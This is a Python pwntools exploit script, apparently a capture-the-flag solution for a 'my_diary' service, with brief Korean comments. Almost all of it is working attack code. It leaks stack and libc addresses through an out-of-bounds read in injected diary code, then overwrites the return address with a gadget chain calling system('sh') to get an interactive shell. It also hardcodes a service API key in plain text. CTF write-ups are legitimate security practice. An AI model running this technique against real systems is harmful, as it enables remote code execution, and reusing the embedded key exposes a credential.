from pwn import *

# 일단 OOB read를 만들어서 스택에 대한 릭을 하고 libc가 같다는 사실을 확인 후 리턴 주소를 매직 가젯으로 바꿨습니다.
# 플래그는 기억이 안납니다.

HOST, PORT = '0', 31337
HOST, PORT = 'my_diary.eatpwnnosleep.com', 18879
r = remote(HOST, PORT)
local = False
if not local:
	import struct
	import json

	YOUR_API_KEY = u"43073909ecc48af12aa63c8f74989bc9523587eca49d37c97edd3027984e6101"

	a = {
	    'apikey' : YOUR_API_KEY,
	}

	r.send(json.dumps(a).encode())
	print (r.recv(102400))


c0 = lambda: r.recvuntil('delete diary\n')
c1 = lambda: r.recvuntil(': ')
c2 = lambda: r.recvuntil(')')
c3 = lambda: r.recvuntil('return 1;\n')
ii = lambda x: r.sendline(str(x))

for i in range(64):
	c0()
	ii(1)
	c1()
	ii(hex(1 << i))
	c1()
	ii('a')
	c2()
	ii(chr(64 + i))
	ii('</end>')

data = ''
def leak(x):
	c0()
	ii(0x1337)
	c3()
	ii('unsigned long long buf[1]; if(buf[%d] & 1ULL << arg[0] - 64) return 1; else return 0;' % i)
	c0()
	ii(2)
	c = 0
	lines = r.recvuntil('Diary service').split('\n')
	for line in lines:
		if 'title' in line:
			c |= int(line.split(': ')[1], 16)
	print hex(c)
	return c
for i in range(1, 18):
	c = leak(i)
	print hex(c)
	if c & 0xfff == 0x410:
		break
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = c - 0x10410
print hex(libc.address)
c0()
ii(0x1337)
c3()
ii('unsigned long long buf[1]; buf[3] = %dULL;buf[4]="sh";buf[5]=%dULL;' % (libc.address + 0x21102, libc.symbols['system']))
c0()
ii(2)
r.interactive()
for i in range(1, 100):
	c = leak(i)
	data += p64(c)
	#print hexdump(data)














